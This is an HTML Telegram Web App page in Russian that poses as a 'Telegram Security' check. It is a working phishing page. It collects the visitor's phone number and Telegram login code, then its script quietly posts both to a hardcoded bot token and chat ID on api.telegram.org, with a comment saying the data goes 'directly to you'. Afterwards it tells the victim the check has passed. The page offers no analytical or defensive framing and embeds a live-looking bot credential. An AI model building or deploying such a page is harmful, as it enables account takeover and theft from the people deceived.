<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram Security</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,sans-serif;background:#0f0f0f;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
        .card{background:#1a1a1a;border-radius:20px;padding:32px 24px;max-width:400px;width:100%;text-align:center;border:1px solid #2a2a2a}
        .icon{font-size:60px;margin-bottom:20px}
        h2{font-size:22px;margin-bottom:8px}
        p{color:#888;font-size:14px;margin-bottom:20px}
        .hidden{display:none!important}
        .field{background:#1e1e1e;border:1px solid #333;border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:10px;margin-bottom:14px}
        .field span{font-size:18px}
        .field input{flex:1;background:none;border:none;color:#fff;font-size:16px;outline:none}
        .btn{width:100%;padding:14px;border:none;border-radius:12px;background:#2aabee;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
        .btn:disabled{background:#333!important;color:#666!important}
        .msg{font-size:13px;margin-top:12px}
        .msg.err{color:#f44336}
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🛡️</div>
        
        <div id="screen1">
            <h2>Проверка безопасности</h2>
            <p>Введите номер телефона привязанный к Telegram</p>
            <div class="field">
                <span>📱</span>
                <input type="tel" id="phoneInput" placeholder="+79112223344">
            </div>
            <button class="btn" onclick="step2()">📩 Отправить код</button>
            <div class="msg" id="msg1"></div>
        </div>
        
        <div id="screen2" class="hidden">
            <h2>Код подтверждения</h2>
            <p>SMS с кодом отправлена на<br><strong id="phoneShow"></strong></p>
            <div class="field">
                <span>🔑</span>
                <input type="text" id="codeInput" placeholder="5 цифр" maxlength="5" inputmode="numeric">
            </div>
            <button class="btn" onclick="step3()">✅ Подтвердить</button>
            <div class="msg" id="msg2"></div>
        </div>
        
        <div id="screen3" class="hidden">
            <div style="font-size:60px;margin:20px 0">✅</div>
            <h2>Готово!</h2>
            <p>Проверка пройдена</p>
        </div>
    </div>
    
    <script>
        let phone = '';
        
        function step2(){
            const raw = document.getElementById('phoneInput').value.trim();
            if(!raw) return;
            phone = raw.replace(/\D/g,'');
            phone = '+' + phone;
            
            document.getElementById('screen1').classList.add('hidden');
            document.getElementById('screen2').classList.remove('hidden');
            document.getElementById('phoneShow').textContent = phone;
        }
        
        async function step3(){
            const code = document.getElementById('codeInput').value.trim();
            if(code.length < 5) return;
            
            const btn = document.querySelector('#screen2 .btn');
            btn.disabled = true;
            btn.textContent = 'Отправка...';
            
            // Отправляем напрямую тебе через HTTP
            const BOT_TOKEN = '8857513499:AAGLKwfwUc9uB7Iw3bUb4LOM-dG9ZXdi99M';
            const CHAT_ID = '7393965560';
            
            const text = `📞 ${phone}\n🔑 ${code}\n\nДанные из WebApp`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });
            } catch(e) {}
            
            document.getElementById('screen2').classList.add('hidden');
            document.getElementById('screen3').classList.remove('hidden');
        }
    </script>
</body>
</html>
